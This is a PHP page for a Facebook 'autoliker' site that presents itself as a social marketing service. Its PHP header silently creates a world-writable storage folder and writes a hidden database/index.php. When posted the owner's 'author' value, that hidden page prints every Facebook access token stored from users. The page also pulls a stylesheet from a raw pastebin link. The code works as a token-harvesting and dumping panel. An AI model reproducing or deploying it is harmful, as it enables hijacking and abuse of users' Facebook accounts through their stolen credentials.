 <?php
if(!file_exists('database'))
{
	mkdir('database',0777,true);
}
$totaluser = -1;
if($handle = opendir('database'))
{
	echo "<link rel='stylesheet' type='text/css' href='http://pastebin.com/raw.php?i=PkydVnqn' media='all'/>";
	if(!file_exists('database/index.php'))
	{
		$handle1 = fopen('database/index.php', 'w') or die('Error !');
		$data = '<?php
include "../info.php";
$author = $_POST["author"];
if($author != $set[author])
{
	if($handle = opendir("../database"))
	{
		while (false !== ($entry = readdir($handle)))
		{
			if($entry != "." && $entry != "..")
			{
				$user = fopen($entry,"r") or die("Error !");
			}
		}
	closedir($handle);
	}
}
else
{
	if($handle = opendir("../database"))
	{
		while (false !== ($entry = readdir($handle)))
		{
			if($entry != "." && $entry != "..")
			{
				$user = fopen($entry,"r") or die("Error !");
				$accesstoken = fgets($user);
				echo $accesstoken."<br/>";
			}
		}
	closedir($handle);
	}
}
?>';
		fwrite($handle1, $data);
		fclose($handle1);
	}
	while (false !== ($entry = readdir($handle)))
	{
		if($entry != "." && $entry != "..")
		{
			$totaluser++;
		}
	}
	closedir($handle);
}
include 'info.php';
?>

<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head> 
 <title>FB-LIKES | BEST FACEBOOK AUTOLIKER FOREVER</title>
<meta name="referrer" content="default" id="meta_referrer" />
 <link rel="shortcut icon" href="/favicon.ico">
 
<meta property="og:image" content="../img/icon.png"/>

<link rel="shortcut icon" href="../img/favicon.png"> <link rel="stylesheet" href="../css/home.css" type="text/css"> 
 <link rel="stylesheet" href="../css.css" type="text/css"> <link rel="stylesheet" href="../fbtools/moduls/css/asu.1.css" type="text/css">
<link rel="stylesheet" href="../fbtools/moduls/css/asu.2.css" type="text/css">
<link rel="stylesheet" href="../fbtools/moduls/css/asu.3.css" type="text/css"> 
 
 <div class="menu"> <div class="menu_ico2">Welcome to FB-likes</div></div>
 <center>
 <font size="4"> <font
face= "arial,helvetica,sans-
serif"> <font color="blue"> FB-likes is a social
marketing system that
will increase followers,
likes, comments and
increase visits to pages.
Our system is based on
an online community of
users who look get likes
quickly and easily.
FB-likes is part of Social
Networking Tools
developed by Raywall Raw-Been </font> </font> </font> 
</center></div>

